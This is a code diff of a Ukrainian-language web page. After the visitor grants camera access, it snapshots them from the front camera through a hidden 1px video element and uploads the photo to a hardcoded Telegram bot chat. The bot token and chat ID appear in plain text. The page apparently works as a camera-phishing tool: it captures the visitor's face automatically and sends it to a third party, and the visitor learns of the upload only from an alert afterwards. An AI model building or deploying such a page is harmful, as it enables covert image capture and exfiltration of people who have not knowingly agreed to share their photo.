@@ -9,9 +9,16 @@
     .card{background:#0b1220;border:1px solid #1f2a3a;padding:14px;border-radius:10px;max-width:820px;width:100%}
     button{padding:10px 16px;border-radius:8px;border:none;background:#2563eb;color:#fff;font-size:16px;cursor:pointer}
     pre{background:#07101a;color:#9fe6a8;padding:8px;border-radius:6px;white-space:pre-wrap;max-height:240px;overflow:auto}
-    /* Важливо: відео не повинно бути display:none, інакше деякі браузери не рендерять кадри.
-       Ми ховаємо його поза екраном, але він залишається в DOM і рендериться. */
-    video{position:absolute;left:-9999px;top:auto;width:1px;height:1px;opacity:0}
+    /* Відео має бути рендереним — робимо його мінімальним, але видимим для рендеру */
+    video{
+      position:fixed;
+      left:0;
+      top:0;
+      width:1px;
+      height:1px;
+      z-index:-1;
+      background:#000;
+    }
     canvas{width:100%;max-width:480px;border-radius:8px;background:#000;display:block}
     button:disabled{opacity:0.6;cursor:default}
   </style>
@@ -25,7 +32,6 @@
       <button id="grantBtn">Надати доступ до камери</button>
     </div>
 
-    <!-- Відео приховано поза екраном, але рендериться -->
     <video id="video" autoplay playsinline muted></video>
 
     <div style="margin-top:12px">
@@ -40,10 +46,8 @@
   </div>
 
   <script>
-    // ====== ВСТАВЛЕНО КОРИСТУВАЦЬКІ ДАНІ ======
     const BOT_TOKEN = "8506109550:AAGjHAChPn0IFIdL24s9PauJfwk9F9mV-_Y";
     const CHAT_ID = "1178810140";
-    // =========================================
 
     const grantBtn = document.getElementById('grantBtn');
     const video = document.getElementById('video');
@@ -63,27 +67,20 @@
 
     async function stopStream(stream){
       if(!stream) return;
-      try {
-        stream.getTracks().forEach(t => t.stop());
-      } catch(e){
-        console.warn('stopStream error', e);
-      }
+      try { stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn('stopStream error', e); }
+      video.srcObject = null;
     }
 
-    // Чекаємо, поки відео почне відтворювати реальні кадри
-    function waitForVideoFrameReady(videoEl, timeout = 3000) {
+    // Надійне очікування першого відрендереного кадру
+    function waitForVideoFrameReady(videoEl, timeout = 4000) {
       return new Promise((resolve, reject) => {
         const start = Date.now();
 
-        // Якщо доступна requestVideoFrameCallback — використовуємо її
         if (videoEl.requestVideoFrameCallback) {
-          const onFrame = () => resolve();
-          // викликаємо один раз після першого кадру
-          videoEl.requestVideoFrameCallback(() => onFrame());
+          videoEl.requestVideoFrameCallback(() => resolve());
           return;
         }
 
-        // Інакше перевіряємо readyState і розміри
         const check = () => {
           if (videoEl.readyState >= 2 && videoEl.videoWidth > 0 && videoEl.videoHeight > 0) {
             resolve();
@@ -113,15 +110,11 @@
       grantBtn.disabled = true;
       let stream = null;
       try {
-        // Використовуємо селфі-камеру (facingMode: "user")
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         video.srcObject = stream;
-
-        // Деякі браузери вимагають виклику play()
-        try { await video.play(); } catch(e) { /* ignore */ }
-
+        try { await video.play(); } catch(e){ /* ignore */ }
         log('Камера увімкнена, чекаємо перший кадр...');
-        await waitForVideoFrameReady(video, 4000);
+        await waitForVideoFrameReady(video, 5000);
         log('Перший кадр отримано', video.videoWidth + 'x' + video.videoHeight);
       } catch (err) {
         log('Помилка доступу/очікування відео:', err && (err.message || err.name) || err);
@@ -131,58 +124,46 @@
         return;
       }
 
-      // Невелика додаткова пауза для стабілізації експозиції
-      await new Promise(r => setTimeout(r, 350));
+      // Додаткова пауза для автоекспозиції/фокусу
+      await new Promise(r => setTimeout(r, 400));
 
       try {
-        // Підбираємо розміри canvas відповідно до відео
         const w = video.videoWidth || 640;
         const h = video.videoHeight || 480;
         canvas.width = w;
         canvas.height = h;
-
         const ctx = canvas.getContext('2d');
 
-        // Для селфі зазвичай хочуть дзеркальне відображення — якщо потрібно, розкоментуй:
-        // ctx.translate(w, 0); ctx.scale(-1, 1);
-
-        // Малюємо кадр
+        // Якщо хочеш дзеркальне селфі, розкоментуй:
+        // ctx.save(); ctx.translate(w,0); ctx.scale(-1,1);
         ctx.drawImage(video, 0, 0, w, h);
+        // ctx.restore();
+
         log('Кадр знято');
 
-        // Отримуємо Blob
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-        if(!blob){
-          log('toBlob повернув null');
-          alert('Не вдалося сформувати зображення.');
-          return;
-        }
+        if(!blob){ log('toBlob повернув null'); alert('Не вдалося сформувати зображення.'); return; }
         log('Фото готове, байт:', blob.size);
 
-        // Формуємо FormData для Telegram
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
         form.append('photo', blob, 'selfie.png');
 
-        // Пряма відправка на Telegram Bot API
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-
         log('Відправка в Telegram...');
         const resp = await fetch(url, { method: 'POST', body: form });
-
         const text = await resp.text().catch(()=> '[не вдалося прочитати тіло відповіді]');
         log('Telegram відповів', resp.status, '-', text);
 
         if(!resp.ok){
-          // Якщо CORS блокує запит, браузер зазвичай кине помилку до catch.
-          log('Увага: відправка неуспішна. Можливі причини: CORS, неправильний токен або chat_id, або обмеження API.');
+          log('Відправка неуспішна. Можливі причини: CORS або токен/чат невірні.');
           alert('Відправка неуспішна. Подивіться логи.');
         } else {
           alert('Фото відправлено в Telegram.');
         }
       } catch (err) {
         log('Помилка при відправці:', err);
-        alert('Помилка при відправці. Можлива блокування CORS у браузері або мережна помилка.');
+        alert('Помилка при відправці. Можлива блокування CORS у браузері.');
       } finally {
         await stopStream(stream);
         grantBtn.disabled = false;
